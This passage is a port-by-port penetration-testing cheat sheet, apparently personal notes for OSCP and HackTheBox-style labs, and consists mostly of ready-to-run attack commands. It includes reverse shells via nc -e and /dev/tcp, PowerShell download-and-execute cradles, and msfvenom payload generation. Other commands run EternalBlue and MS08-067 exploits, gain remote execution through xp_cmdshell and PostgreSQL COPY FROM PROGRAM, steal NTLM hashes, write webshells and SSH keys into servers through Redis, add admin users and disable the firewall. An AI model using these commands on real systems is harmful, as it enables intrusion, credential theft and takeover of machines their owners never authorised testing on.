rpcclient -U "" 192.168.3.2
srvinfo
enumdomusers
getdompwinfo
querydominfo
netshareenum
netshareenumall
querydispinfo
enumprinters

#rpcinfo
rpcinfo -p ip

#Connect to an RPC share without a username and password and enumerate privledges
rpcclient --user="" --command=enumprivs -N $ip

#Connect to an RPC share with a username and enumerate privledges
rpcclient --user="<Username>" --command=enumprivs $ip

# enum rpc, maybe have user and pwd.
rpcclient -W '' -c querydispinfo -U''%'' '192.168.120.181'   
```

## 139/445-SMB
+ samba服务可跨平台共享文件（windows & linux）
+ 较多可利用的exploit
+ enum password policy and windows version via crackmapexec
+ smb file download
+ smb share netlogon, check the vbs file, could contains password.
+ check smbshare and permission(writable)
+ scf attack to steal ntlmv2
+ other, [hack article smb pentest](https://www.hackingarticles.in/smb-penetration-testing-port-445/)

```bash
# netbios service, port 139,445
nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254

# nbtscan  可发现users
nbtscan -r 192.168.3.1/24

# nmap nse scan, smb os discovery, samba scan
nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>

# smb vuln scan, enum version/vuln
nmap --script smb-vuln* -p 445 $tip
nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.5

# smb vuln check, with args
nmap –-script smb-check-vulns.nse –script-args=unsafe=1 -p445  -iL smbhost.txt -oG smbvuln.txt

# smb enum
nmap -p 445 -A $tip

# enum smb banner
## nmap version版本不可用时，考虑sh获取版本或wireshark抓包,[lab-tophat]
## https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh

# connect smb
## -U, username
## -P, password
## -L, ip
## -m, max protocol, SMB1/SMB2/SMB3/NT1/
## --option='client min protocol=NT1'
smbclient -L 192.168.1.102
smbclient -L tip -U '' -P ''
smbclient //192.168.1.106/tmp
smbclient \\\\192.168.1.105\\ipc$ -U john 
smbclient //192.168.1.105/ipc$ -U john
smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'

# enum smb share and permission
smbmap -H ip
smbmap -H ip -u '' -p ''
smbmap -H ip -u 'guest' -p ''
## if nothting, user null user.
smbmap -H ip -u null

# enum4linux
enum4linux -a 192.168.3.2

# crackmapexec null session enum
crackmapexec smb --shares 10.10.10.3 -u '' -p ''

# obtain the version and pwd policy.
crackmapexec smb $tip -u '' -p '' --pass-pol

mount -t cifs -o user=USERNAME,password,sec=ntlm,dir_mode=0077 "//10.10.10.10/My Share" /mnt/cifs

# smb share check permission
smbcacls -N '//$tip/Department Shares' Users
for i in $(ls); do echo $i; smbcacls -N '//$tip/Department Shares' $i; done

# got the file tree.
find . -ls | tee tree.txt
xxd * | grep -v "0000 0000 0000 0000"

# msf psexec
use exploit/windows/smb/psexec

# scf attack to steal ntlm

```

### smb config

```bash
└─$ smbclient -L 10.11.1.136
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED

# edit /etc/samba/smb.conf
client min protocol = NT1
or
client min protocol = CORE
client max protocol = SMB3

```

配置guide参考[configure samba](https://help.ubuntu.com/community/How%20to%20Create%20a%20Network%20Share%20Via%20Samba%20Via%20CLI%20(Command-line%20interface/Linux%20Terminal)%20-%20Uncomplicated,%20Simple%20and%20Brief%20Way!)

### smb3.0-Username map script
[HTB-lame](https://coldfusionx.github.io/posts/LameHTB/#samba---port-139445)

```bash
# crackmapexec usernme
crackmapexec smb --shares 10.10.10.3 -u './=`nohup nc -e /bin/sh 10.10.14.17 8021`' -p ''

# crackmapexec-smbexec
crackmapexec smb -x "./=`nohup nc -e /bin/sh 10.10.14.17 8022`" --exec-method smbexec 10.10.10.3

# python exploit
https://github.com/amriunix/CVE-2007-2447/blob/master/usermap_script.py
```

### ms08-067

* 利用1，生成reverse shell exe 后反弹shell
https://ratiros01.medium.com/hackthebox-legacy-machine-5d8a41a77940

exploit py
https://ratiros01.medium.com/hackthebox-legacy-machine-5d8a41a77940

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe
nc -lvp 1234
python send_and_execute.py <target ip> <shell path>
```

* 利用2 生成 shellcode 修改py后获取 reverse shell
https://ratiros01.medium.com/hackthebox-legacy-machine-5d8a41a77940
https://medium.com/@siddharth.singhal1995/htb-walkthrough-legacy-without-metasploit-2-1baa34ade364


```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.33 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

nc -nvlp 443
python2 ms-067.py target-ip OSversioncode Target-port
```

* msfconsole
exploit/windows/smb/ms08-067-netapi

### ms17-010
https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
https://medium.com/@siddharth.singhal1995/htb-walkthrough-legacy-without-metasploit-2-1baa34ade364
[EternalBlue without Metasploit](https://redteamzone.com/EternalBlue/)
[Autoblue ms17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

* send_and_execute.py
git repo, https://github.com/helviojunior/MS17-010
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.196 LPORT=443 EXITFUNC=thread -f exe -a x86 — platform windows -o shell-443.exe

nc -nvlp 443
python2 send_and_execute targetid shell.exe
```

> `STATUS_ACCESS_DENIED`, set USERNAME `guest`
> `Not found accessible named pipe.`, set USERNAME `guest`

* exploit 42315
```bash
## add user, psexec
service_exec(conn, r'cmd /c net user test Password123 /add & net localgroup administrators shadow /add')
service_exec(conn, r'cmd /c net localgroup administrators test /add')
service_exec(conn, r'cmd /c netsh firewall set opmode disable')

psexec.py test:Password123@ip

smb_send_file(smbConn,'shell.exe','C','/windows/tasks/yourfile')
service_exec(conn, r'cmd /c C:\windows\tasks\yourfile <some syntax>')
# or no cmd /c 
service_exec(conn, r'C:\windows\tasks\yourfile <some syntax>')
```

* msf
exploit/windows/smb/ms17_010_eternalblue
exploit/windows/smb/ms17_010_psexec

## 143/993-IMAP
+ IMAP，Internet Mail Access Protocol，收取邮件。从本地邮件客户端（outlook）访问远程server上的邮件，同时将客户端的邮件操作反馈到服务器。
+ get mail, found info.
+ pg hepet, get mail and client-side attack.

```bash
143/tcp   open     imap     Mercury/32 imapd 4.62
993 secure port for IMAP

# mercury imap, get mail
kali@kali:~$ nc 192.168.120.132 143
* OK localhost IMAP4rev1 Mercury/32 v4.62 server ready.

tag login jonas@localhost SicMundusCreatusEst
tag OK LOGIN completed.

tag LIST "" "*"
* LIST (\NoInferiors) "/" INBOX
tag OK LIST completed.

tag SELECT INBOX
* 5 EXISTS
* 0 RECENT
* FLAGS (\Deleted \Draft \Seen \Answered)
* OK [UIDVALIDITY 1603187673] UID Validity
* OK [UIDNEXT 6] Predicted next UID
* OK [PERMANENTFLAGS (\Deleted \Draft \Seen \Answered)] Settable message flags
tag OK [READ-WRITE] SELECT completed.

tag STATUS INBOX (MESSAGES)
* STATUS INBOX (MESSAGES 5)
tag OK STATUS completed.

tag fetch 1 (BODY[1])
* 1 FETCH (BODY[1] {134}
Hey Jonas,

Please change your password, you cannot use the same password as your one liner description, just dont.

Thanks!
)
* 1 FETCH (FLAGS (\SEEN))
tag OK FETCH complete.

# imap brute force

```

## 161/162-SNMP
**Simple Network Management Protocol**, **SNMP** has a lot of information about the host and things that you may find interesting are: 
+ Network interfaces (IPv4 and IPv6 address)
+ Usernames
+ Uptime
+ Server/OS version
+ processes running (may contain passwords or service/process vulnerable)....
+ snmp 

```bash
//SNMP scan, --open 过滤open端口
sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt

// onesixtyone brute force community strings
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips
onesixtyone -c community -i ips

//snmpwalk enum corresponding  values
snmpwalk -c public -v1 10 10.11.1.14
snmpwalk -c public -v2c 10 10.11.1.14  # default for windows  v2c

// enum windows users
snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25

// enum running windows process 
snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2

// enum installed software
snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2

# snmp-check
snmp-check [DIR_IP] -p [PORT] -c [COMM_STRING]
snmp-check $tip

# snmp nmap scan
nmap --script "snmp* and not snmp-brute" <target>

```

## 194/6667/6660-7000 - IRC
+ default port, 194/6667/6660-7000
+ brute force 
+ practise - pg ut99
+ hexcat connect get info

```bash
# banner
PORT     STATE SERVICE
6667/tcp open  irc

# enum banner
nc -vn <IP> <PORT>
openssl s_client -connect <IP>:<PORT> -quiet

# scan IRC service
nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 irked.htb

# user brute force
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>

# hexchat join irc
sudo apt install hexchat
hexchat
## add network, input ip/port and connect
## server>channellist > search channel
## join channel may get some info 

```

## 389/636-Ldap
Lightweight Directory Access Protocol
+ enum domain users
+ enum domain default password, anonymous log grep  password/passwd/pwd/default/set/reset/cred

```bash
# no passwd, enum user
ldapsearch -h 192.168.3.2 -p 389 -x -b "dc=xxsite, dc=com"

## enum user 2;
ldapsearch -H ldap://$tip:389 -x -b "DC=active,DC=htb" '(Objectclass=user)' samaccountname | grep -i samaccountname

## check for key words, password/pwd/default/set/reset/cred/cascadeLegacyPwd
ldapsearch -H ldap://$tip:389 -x -b "DC=htb,DC=local" > ldap-anonymous.log
grep -i password ldap-anonymous.log

# passwd, enum user
ldapsearch -H ldap://$tip:389 -D 'svc_tgs' -w 'GPPstillStandingStrong2k18' -x -b "DC=active,DC=htb" '(Objectclass=user)' samaccountname | grep -i samaccountname

# enum nameing contexts, could contains subdomain
ldapsearch -H ldap://$tip -x -s base namingcontexts
```

## 873-Rsync
> rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification timesand sizes of files.[3] It is commonly found on Unix-like operating systems. The rsync algorithm is a type of delta encoding, and is used for minimizing network usage. Zlib may be used for additional data compression,[3] and SSH or stunnel can be used for security.

+ down and upload file
+ upload ssh pub to get shell. pg - fail
+ post: rsyncd configuration file parameter secret file, could contains usernames and passwords

```bash
# banner
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack

# manual enumnc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy        	
NAS_Public     	
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password


# enum share folder
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

#Example using IPv6 and a different port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730

# brute force
rsync -av --list-only rsync://192.168.0.123/shared_name

# down file
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared

# upload file
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```


## 1433-mssql
+ microsoft sql server,default port, 1433; other, 1435
+ brute force
+ xp_cmdshell, rce - reverse shell
+ xp_dirtree, steal hash
+ Privesc
+ data browser via dbeaver
+ have creds or sqli, enum ad user with `SUSER_SID` and `SUSER_SNAME` 
+ more, [hacktricks mssql](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)

**mdf file extract and get password**
> insider, [mdf extract hash](https://blog.xpnsec.com/extracting-master-mdf-hashes/)

```bash
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM

# nmap 
nmap --script-help "*ms* and *sql*"

nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

### Brute force
brute force
```bash
#Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
#Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# xp_cmdshell enable, RCE
```

### NTLM hash steal

```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'

msf> use auxiliary/admin/mssql/mssql_ntlm_stealer

sudo responder -I tun0 
```

### have creds

```bash
## sqsh login 
# -S, host:port
# -U, username
# -P, password
sqsh -S 192.168.3.2 -U sa
sqsh -S tip -U sa -P [password]
sqsh -S tip:1435 -U sa -P [password]

## impacket mssqlclient login
#Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine
mssqlclient.py  -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

#Once logged in you can run queries:
SQL> select @@version;

#Steal NTLM hash
sudo responder -I <interface> #Run that in other console
SQL> exec master..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' #Steal the NTLM hash, crack it with john or hashcat

#Try to enable code execution
SQL> enable_xp_cmdshell

#Execute code, 2 sintax, for complex and non complex cmds
SQL> xp_cmdshell whoami /all
SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# domain user enum 
SUSER_SNAME(domain user sid)
## output binary thing
SUSER_SID(domain\name)
## convert to hex str
master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator'))

```

### xp_cmdshell

after have creds
git py exploit,https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py

**lab-ralph, pg-Meathead**

```bash
sqsh -S <IP> -U <Username> -P <Password> -D <Database>


#this turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#this enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'

# Bypass blackisted "EXEC xp_cmdshell"
‘; DECLARE @x AS VARCHAR(100)=’xp_cmdshell’; EXEC @x ‘ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net’ —

# RCE
>EXEC master..xp_cmdshell 'whoami'
>go

## powershell rce
xp_cmdshell "powershell.exe -exec bypass IEX(New-Object System.Net.Webclient).DownloadString('http://192.168.119.196/powercat.ps1')"

## smb share nc rce, no need to save file on target
xp_cmdshell '\\192.168.49.79\share\nc.exe -e cmd.exe 192.168.49.79 1221';
```

### msf
```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass

```

## 1521-oracle

```bash
#enum
tnscmd10g version -h [ip]
tnscmd10g status -h [ip]

#msf bruteforce isd
auxiliary/scanner/oracle/sid_brute
```

## 1978-RmoteMouse
+  [RemoteMouse 3.008 - Arbitrary Remote Command Execution](https://www.exploit-db.com/exploits/46697)
+  pg-mice

## 2049-NFS
Network file system

```bash
//bannber grab
nc -nv ip 2049

//identify hosts have portmapper/rpcbind running
nmap -v -p 111 10.11.1.1-254

// nse rpcinfo
nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254

// all nsf script scan
nmap -p 111 --script nfs* 10.11.1.72

// mount dir  -o nolock, disable file locking
mkdir home
sudo mount -o nolock 10.11.1.72:/home ~/home/
cd home/ && ls

//show mounting info for an nfs server
showmount -d ip
showmount -a ip
showmount -e [ip]

mount [ip]:/ /tmp/nfs
mount -t [ip]:/ /tmp/nfs

// add user and change UUID for permission issue
sudo adduser pwn
sudo sed -i -e 's/1001/1014/g' /etc/passwd
su pwn 
id
cat xxx.txt
```

## 3128-Squid Proxy
+ squid http proxy service
+ set proxy in browser
+ use spose to port scan, [spose git](https://github.com/aancw/spose)

```bash
PORT     STATE  SERVICE      VERSION
3128/tcp open   http-proxy   Squid http proxy 4.11

# Try yo proxify curl
curl --proxy http://10.10.11.131:3128 http://10.10.11.131

# spose port scan
python spose.py --proxy http://targetip:3128 --target 127.0.0.1

# proxychains 
echo 'http targetip 3128' | sudo tee -a /etc/proxychain4.conf
proxychains nmap -sT -n -p- localhost
proxychains nmap -sT -n -p- 127.0.0.1
```

## 3306-mysql

默认弱口令root:root
mysql-commands cheat sheet[sheet](http://cse.unl.edu/~sscott/ShowFiles/SQL/CheatSheet/SQLCheatSheet.html)
```bash
#登录
mysql --host=[ip] -u root -p
mysql -h [hostname] -u root
mysql -h [hostname] -u root@localhost
mysql -h [hostname] -u ""@localhost

telnet 192.168.3.2 3306

cat /etc/my.cnf //configuration file
```

获取mysql password
```bash
cat /var/www/html/configuration.php

<?php
class JConfig {
    var $mailfrom = 'admin@rainng.com';
    var $fromname = 'testuser';
    var $sendmail = '/usr/sbin/sendmail';
    var $password = 'myPassowrd1234';
    var $sitename = 'test';
    var $MetaDesc = 'Joomla! - the dynamic portal engine and content management system';
    var $MetaKeys = 'joomla, Joomla';
    var $offline_message = 'This site is down for maintenance. Please check back again soon.';
    }
```

## 3389-RDP
Remote Desktop Protocal
RCE vulnaerability, dos, ms12-020
```bash
#login
rdesktop -u guest -p guest 192.168.3.2 -g 90%

rdesktop -d xxx.com -u -p ip

xfreerdp

#brute force 
ncrack -vv --user Administrator -P password.txt rdp://192.168.3.2
```

## 3632-distcc
参考htb-lame
cve-2004-2687

```bash
msf5 > use exploit/unix/misc/distcc_exec
nmap -p 3632  <ip> --script distcc-exec --script-args="distcc-exec.cmd='id'"

```

## 4505/4506-ZeroMQ
+ zmtp 2.0, salt-api/3000-1, [available remote code execution exploit](https://github.com/dozernz/cve-2020-11651).

```bash
PORT     STATE SERVICE VERSION
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0

# pg-twiggy, cve-2020-11651
## https://github.com/jasperla/CVE-2020-11651-poc/blob/master/exploit.py
pyenv virtual-env twiggy
pyenv activate twiggy
python exploit.py -m 192.168.112.62 -r /etc/passwd
python exploit.py -m 192.168.112.62 --exec "bash -i >& /dev/tcp/192.168.49.112/8000 0>&1"

```

## 4555-rsip
RPC port 无结果时，可查看该端口
Apache James Server 2.3.2
RCE：https://www.exploit-db.com/exploits/35513

root:root default login
reset pwd and read email

```bash
//banner grab
nc -nvC $tip 4555
root
root
setpassword ryuu abcd

nc -nvC $tip 110
USER ryuu
PASS abcd
LIST
RETR 1
RETR 2
```

## 5443/5433-Postgresql
+ PostgreSQL is an **open source object-relational database system that uses and extends the SQL language.
+ brute force, Client authentication is controlled by a config file frequently named pg_hba.conf
+ authencated rce.[postgresql rce](https://nosec.org/home/detail/2368.html), [hacktricks-postgresql rce](https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions); PG-Nibbles
+ pgexec, upload so to get shell. [pgexec](https://github.com/Dionach/pgexec)
+ post: passwords inside pgadmin4.db file
+ [hacktricks - postgresql](https://book.hacktricks.xyz/pentesting/pentesting-postgresql)

```bash
# banner
PORT     STATE SERVICE
5432/tcp open  pgsql

# enum
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection

# connect
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection

psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

#Read a file
CREATE TABLE demo(t text);
COPY demo from '[FILENAME]';
SELECT * FROM demo;

#Write ascii to a file (copy to cannot copy binary data)
COPY (select convert_from(decode('<B64 payload>','base64'),'utf-8')) to 'C:\\some\\interesting\path.cmd'; 

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

#Check if current user is superiser
SELECT current_setting('is_superuser'); #If response is "on" then true, if "off" then false

#Check if plpgsql is enabled
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql'

#Change password
ALTER USER user_name WITH PASSWORD 'new_password';

#Check users privileges over a table (pg_shadow on this example)
SELECT grantee, privilege_type 
FROM information_schema.role_table_grants 
WHERE table_name='pg_shadow'

#Get users roles
SELECT 
      r.rolname, 
      r.rolsuper, 
      r.rolinherit,
      r.rolcreaterole,
      r.rolcreatedb,
      r.rolcanlogin,
      r.rolconnlimit, r.rolvaliduntil,
  ARRAY(SELECT b.rolname
        FROM pg_catalog.pg_auth_members m
        JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
        WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;
```

**postgresql rce**
```bash
postgres=# \c postgres;
psql (12.2 (Debian 12.2-1+b1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "postgres" as user "postgres".
postgres=# DROP TABLE IF EXISTS cmd_exec;
NOTICE:  table "cmd_exec" does not exist, skipping
DROP TABLE
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM 'wget http://192.168.234.30/nc';
COPY 0
postgres=# DELETE FROM cmd_exec;
DELETE 0
postgres=# COPY cmd_exec FROM PROGRAM 'nc -n 192.168.234.30 5437 -e /usr/bin/bash';

```

## 5901-VNC
+ vnc service
+ vnc connect + dosbox privesc, pg-nukem

```bash
port 5901

vncviewer localhost:5901
```

## 5985/5984-WinRM
+ Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.
+ password/hashes to login
+ evil-winrm, [evil-winrm git](https://github.com/Hackplayers/evil-winrm)

```bash
# evil-winrm install 
gem install evil-winrm

# menu, check menu command.
menu

# common command.
## enable with powershell on attacker windows machine
Enable-PSRemoting -Force
upload
download
Bypass-4MSI

# usage
## connect with password
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>

## pass the hash
evil-winrm -u <username> -H <Hash> -i <IP>

## download and upload file
## Relative paths are not allowed to use on download/upload. Use filenames on current directory or absolute path
upload local_filename
upload local_filename destination_filename
download remote_filename 
download remote_filename destination_filename

download c:\temp\ntds\ntds.dit /home/kali/lab/htb/blackfield/ntds.dit
upload /home/kali/lab/htb/blackfield/Copy-VSS.ps1 c:\temp\copy.ps1

# crackmapexec, password sparay, pass the hash, user bruteforce
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
crackmapexec winrm 192.168.178.175 -u user -H :NTLM-hash -d domain 
crackmapexec winrm 192.168.178.175 -u user.list -H hashes.list 

# with a malicious binary uploaded, run
## Start a malicious service
winrs -r:192.168.1.2 -u:CORP\user -p:password service.exe

## Add a user
winrs -r:192.168.1.2 -u:CORP\user -p:password "cmd.exe /c net user hacker P@ssw0rd /add"
```

## 6379-Redis
+ open source(BSD licensed), in-memory data structure store, used as a database, cache and message broker (from here). 
+ By default and commonly Redis uses a plain-text based protocol, also implement ssl/tls. 
+ run Redis with [ssl/tls](https://fossies.org/linux/redis/TLS.md)
+ [hacktricks redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)
+ exploit rce: webshell/ssh/crontab/load redis module
  > pg-wombo, load redis module , [exploit](https://github.com/n0b0dyCN/redis-rogue-server) 
  > rce -ssh, [exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)
  > rce -crontab
  > redis hacking [tips](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html)
+ load redis module via ftp/web/ssh/smb
+ redis conf file, /etc/redis/redis.conf, /etc/systemd/system/redis.service

```bash
# banner
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9

# redis config file
## contains the password
/etc/redis/redis.conf

## read and write dir, configured
/etc/systemd/system/redis.service

# auto enum
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server

# manual enum
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools

# often use command
info
client list
config get * 

## dump db
select 1
keys *
get [key]
```

### redis webshell php
+ write file to web dir and get shell
+ write file to redis dir, then get shell

```bash
# webshell rce
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK

## reverse shell, write file to get shell; pg-readys
## if no write permission to web dir.
## save with error "(error) ERR"
## read the file to get redis write dir, /etc/systemd/system/redis.service
192.168.120.85:6379> config set dir /opt/redis-files
OK
192.168.120.85:6379> config set dbfilename test.php
OK
192.168.120.85:6379> set test "<?php system('id'); ?>"
OK
192.168.120.85:6379> save
OK
192.168.120.85:6379> 

curl http://ip/test.php
```

### redis - SSH
+ write ssh pub and ssh via private key.

```bash
# ssh get shell
## generate key
ssh-keygen -t rsa
(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt # echo to file
cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key         # import file to redis

## save public key to authorized_keys 
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK

## ssh to target
ssh -i id_rsa redis@$tip

## load redis module to rce
python ./redis-rogue-server.py --rhost $tip --rport 6379 --lhost $kip --lport 6379

```

###  module load
+ load module to rce
+ upload so via http/ftp/smb/other service
+ [redis ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) 
+ redis 5.0.x [redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server) 

## 6697-IRCd
+ ircd, unrealIRCd; 3.2.8.1 backdoor
+ nc connect, USER command enum the version.

```bash
# enum the version
## USER command: USER <user> <host> <server> :<Password>
nc -nv $tip 6697
PASS test123
NICK test

USER test hostname servername :test123

# nmap sv scan, backdoor
nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 6697,8067 irked.htb
```

## 9505-HFS
[bethany]

hfs 2.3.2
[htb-optimum-writeup](https://medium.com/@nmappn/htb-optimum-writeup-9680466f01f7)

**HFS rec check with tcmdump**
```bash
[http://10.11.1.50:9505/?search=%00](http://10.11.1.50:9505/?search=%00){.+exec|cmd.exe+/c+ping+/n+1+192.168.119.196.}

# check icmp pack
tcpdump -i tun0 icmp and src 10.11.1.50

```

## 11211-Memcache
+ mannual / auto enum.
+ find slabs with active items
+ get key names of the slabs detected before
+ Ex-filtrate the saved data by getting the key names
+ memcached poison with pickle, pg-shifty.

```bash
PORT      STATE SERVICE
11211/tcp open  unknown

# data may be appearing and disappearing
echo "version" | nc -vn -w 1 <IP> 11211      #Get version
echo "stats" | nc -vn -w 1 <IP> 11211        #Get status
echo "stats slabs" | nc -vn -w 1 <IP> 11211  #Get slabs
echo "stats items" | nc -vn -w 1 <IP> 11211  #Get items of slabs with info
echo "stats cachedump <number> 0" | nc -vn -w 1 <IP> 11211  #Get key names (the 0 is for unlimited output size)
echo "get <item_name>" | nc -vn -w 1 <IP> 11211  #Get saved info

#This php will just dump the keys, you need to use "get <item_name> later"
sudo apt-get install php-memcached
php -r '$c = new Memcached(); $c->addServer("localhost", 11211); var_dump( $c->getAllKeys() );'

# nmap auto 
nmap -n -sV --script memcached-info -p 11211 <IP>   #Just gather info
msf > use auxiliary/gather/memcached_extractor      #Extracts saved data
msf > use auxiliary/scanner/memcached/memcached_amp #Check is UDP DDoS amplification attack is possible 

```

## 27017/27018-Mongodb
+ mannual enum, python
+ nmap auto enum, script mongo* and default
+ default login, admin/password
+ password crack, need to know client and server nonce, salt, password hash. pg-tico, [blog post](https://www.mongodb.com/blog/post/improved-password-based-authentication-mongodb-30-scram-explained-part-1)
+ update content to bypass nodebb; pg-tico
 
```bash
PORT      STATE SERVICE VERSION
